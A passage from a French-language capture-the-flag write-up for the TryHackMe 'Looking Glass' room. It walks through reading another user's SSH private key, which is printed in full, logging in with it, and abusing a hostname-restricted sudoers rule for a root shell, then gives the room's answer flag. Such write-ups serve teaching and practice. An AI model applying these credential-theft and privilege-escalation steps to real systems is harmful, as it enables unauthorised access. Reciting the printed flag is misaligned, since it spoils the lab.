drwx------  3 humptydumpty humptydumpty 4096 Sep  2 18:40 humptydumpty
drwxrwxrwx  5 jabberwock   jabberwock   4096 Jul  3  2020 jabberwock
drwx------  5 tryhackme    tryhackme    4096 Jul  3  2020 tryhackme
drwx------  3 tweedledee   tweedledee   4096 Jul  3  2020 tweedledee
drwx------  2 tweedledum   tweedledum   4096 Jul  3  2020 tweedledum


```

Le dossier alice est bizare tout le mode peut exécuter des programmes.   

```bash
humptydumpty@looking-glass:/home/tweedledum$ ls ../alice/
ls ../alice/
ls: cannot access '../alice/': Permission denied

humptydumpty@looking-glass:/home/tweedledum$ cd /home/alice
cd /home/alice

cd .ssh
humptydumpty@looking-glass:/home/alice/.ssh$ 

humptydumpty@looking-glass:/home/alice/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
NIRchPaFUqJXQZi5ryQH6YxZP5IIJXENK+a4WoRDyPoyGK/63rXTn/IWWKQka9tQ
2xrdnyxdwbtiKP1L4bq/4vU3OUcA+aYHxqhyq39arpeceHVit+jVPriHiCA73k7g
HCgpkwWczNa5MMGo+1Cg4ifzffv4uhPkxBLLl3f4rBf84RmuKEEy6bYZ+/WOEgHl
fks5ngFniW7x2R3vyq7xyDrwiXEjfW4yYe+kLiGZyyk1ia7HGhNKpIRufPdJdT+r
NGrjYFLjhzeWYBmHx7JkhkEUFIVx6ZV1y+gihQIDAQABAoIBAQDAhIA5kCyMqtQj
X2F+O9J8qjvFzf+GSl7lAIVuC5Ryqlxm5tsg4nUZvlRgfRMpn7hJAjD/bWfKLb7j
/pHmkU1C4WkaJdjpZhSPfGjxpK4UtKx3Uetjw+1eomIVNu6pkivJ0DyXVJiTZ5jF
ql2PZTVpwPtRw+RebKMwjqwo4k77Q30r8Kxr4UfX2hLHtHT8tsjqBUWrb/jlMHQO
zmU73tuPVQSESgeUP2jOlv7q5toEYieoA+7ULpGDwDn8PxQjCF/2QUa2jFalixsK
WfEcmTnIQDyOFWCbmgOvik4Lzk/rDGn9VjcYFxOpuj3XH2l8QDQ+GO+5BBg38+aJ
cUINwh4BAoGBAPdctuVRoAkFpyEofZxQFqPqw3LZyviKena/HyWLxXWHxG6ji7aW
DmtVXjjQOwcjOLuDkT4QQvCJVrGbdBVGOFLoWZzLpYGJchxmlR+RHCb40pZjBgr5
8bjJlQcp6pplBRCF/OsG5ugpCiJsS6uA6CWWXe6WC7r7V94r5wzzJpWBAoGBAM1R
aCg1/2UxIOqxtAfQ+WDxqQQuq3szvrhep22McIUe83dh+hUibaPqR1nYy1sAAhgy
wJohLchlq4E1LhUmTZZquBwviU73fNRbID5pfn4LKL6/yiF/GWd+Zv+t9n9DDWKi
WgT9aG7N+TP/yimYniR2ePu/xKIjWX/uSs3rSLcFAoGBAOxvcFpM5Pz6rD8jZrzs
SFexY9P5nOpn4ppyICFRMhIfDYD7TeXeFDY/yOnhDyrJXcbOARwjivhDLdxhzFkx
X1DPyif292GTsMC4xL0BhLkziIY6bGI9efC4rXvFcvrUqDyc9ZzoYflykL9KaCGr
+zlCOtJ8FQZKjDhOGnDkUPMBAoGBAMrVaXiQH8bwSfyRobE3GaZUFw0yreYAsKGj
oPPwkhhxA0UlXdITOQ1+HQ79xagY0fjl6rBZpska59u1ldj/BhdbRpdRvuxsQr3n
aGs//N64V4BaKG3/CjHcBhUA30vKCicvDI9xaQJOKardP/Ln+xM6lzrdsHwdQAXK
e8wCbMuhAoGBAOKy5OnaHwB8PcFcX68srFLX4W20NN6cFp12cU2QJy2MLGoFYBpa
dLnK/rW4O0JxgqIV69MjDsfRn1gZNhTTAyNnRMH1U7kUfPUB2ZXCmnCGLhAGEbY9
k6ywCnCtTz2/sNEgNcx9/iZW+yVEm/4s9eonVimF+u19HJFOPJsAYxx0
-----END RSA PRIVATE KEY-----
```

Par contre on peut aller dans les répertoires de alice et lire la clef privée SSH.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ chmod 600 id_rsa
tim@kali:~/Bureau/tryhackme/write-up$ ssh -i id_rsa alice@lookingglass.thm 
Last login: Fri Jul  3 02:42:13 2020 from 192.168.170.1
```

On copie la clef privée dans un fichier.
On met les bons droit.  
On se connect au shell d'alice.   

```bash
alice@looking-glass:~$ cat /etc/sudoers.d/alice 
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```

Dans les configurations de sudo le hostname ssalg-gnikoll peut exécuter /bin/bash sans mot de passe avec les droits root.    

```bash
alice@looking-glass:~$ sudo -h ssalg-gnikool /bin/bash
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:~# cat /root/root.txt
}f3dae6dec817ad10b750d79f6b7332cb{mht
root@looking-glass:~# cat /root/root.txt | rev
thm{bc2337b6f97d057b01da718ced6ead3f}
```

On obtient un shell root.
On lit le fichier root.txt dans root.
On remet en place le flag.

La réponse est : thm{bc2337b6f97d057b01da718ced6ead3f}    